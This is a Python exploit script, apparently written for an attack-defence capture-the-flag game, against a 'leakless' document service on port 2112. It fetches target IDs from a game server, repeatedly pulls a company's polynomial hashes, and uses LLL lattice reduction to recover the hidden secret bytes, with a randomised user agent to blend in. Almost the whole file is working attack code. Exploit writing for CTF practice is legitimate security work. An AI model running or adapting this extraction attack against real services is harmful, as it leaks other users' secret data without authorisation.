#!/usr/bin/python3

import requests
import json
import sys
import random
from sage.all import crt, Matrix, identity_matrix
from fake_useragent import UserAgent
from string import ascii_uppercase, digits, ascii_lowercase
alph = (ascii_uppercase + digits + '=').encode()


ua = UserAgent()



def random_string(length):
    return "".join(random.choices(alph.decode(), k=length))

def register(host, username, password, company_name):
    reg = {"login": username, "password": password, "name": company_name}
    r = s.post(f"{host}/api/register", json=reg)
    jwt = r.json()["message"]["jwt"]
    s.headers.update({"Authorization": f"Bearer {jwt}"})
    return r.json()["message"]["jwt"]

def get_compaines(host, offset, limit):
    r = s.get(f"{host}/api/companies?offset={offset}&limit={limit}")
    companies = r.json()["message"]
    return companies

def get_company_document_ids(host, company_id):
    r = s.get(f"{host}/api/company/{company_id}")
    company = r.json()["message"]
    return company.documents

def get_doc_by_id(host, doc_id, sanitized=True):
    r = s.get(f"{host}/api/doc/{doc_id}" + ("/sanitized" if sanitized else ""))
    print(r.json()["message"])
    return r.json()["message"]

def get_me(host):
    r = s.get(f"{host}/api/me")
    return r.json()["message"]

def create_secret(host, secret):
    r = s.put(f"{host}/api/me/secret", json={"secret": secret})
    print(r.status_code, r.text)

def create_document(host, company_id, secret):
    r = s.put(f"{host}/api/company/{company_id}/doc", json={"text": secret})
    print(r.status_code, r.text)


def edit_company(host, name, login, password):
    r = s.post(f"{host}/api/me/edit", json={"name": name, "login": login, "password": password})
    print(r.status_code, r.text)

def login(host, login, password):
    login = {"login": login, "password": password}
    r = s.post(f"{host}/api/login", json=login)
    jwt = r.json()["message"]["jwt"]
    s.headers.update({"Authorization": f"Bearer {jwt}"})
    return r.json()["message"]["jwt"]

def get_company_hashes(host, company_id):
    r = s.get(f"{host}/api/company/{company_id}/hashes")
    return r.json()["message"]

def get_attack_data():
    data = requests.get("http://10.10.10.10/api/client/attack_data/").json()
    return data["leakless"]

def exploit(host, id_):
    hashes = []
    mods = []
    qs = []
    mn = 32
    for _ in range(mn):
        hs = get_company_hashes(host, id_)
        mods.append(hs["p"])
        qs.append(hs["q"])
        hashes.append([])
        for h in hs["hashes"]:
            hashes[-1].append((h["hash"], h["len"]))

    
    for i in range(len(hashes[0])):
        curlen = hashes[0][i][1]
        cs = [x[i][0] for x in hashes]

        m = Matrix(mn + 1 + curlen)
        m1 = [[pow(qs[i], j, mods[i]) for i in range(len(qs))] for j in range(curlen)]
        m1.append(cs)
        for i in range(len(mods)):
            tmp = [0 for _ in range(32)]
            tmp[i] = mods[i]
            m1.append(tmp)
        
        m.set_block(0, 0, Matrix(m1))
        m.set_block(curlen, curlen, identity_matrix(mn + 1))
        t = m.LLL()
        for c in t:
            if 0 in c:
                tmp = m.solve_left(c)
                tmp = [abs(l) for l in tmp if abs(l) < 256]
                print(bytes(tmp)[::-1])



if __name__ == "__main__":
    addr = sys.argv[1]
    host = f"http://{addr}:2112"

    s = requests.Session()

    headers = {
        'user-agent': ua.random,
    }

    s.headers.update(headers)    

    ad = get_attack_data()[addr]
    for id_ in ad:
        exploit(host, id_) 
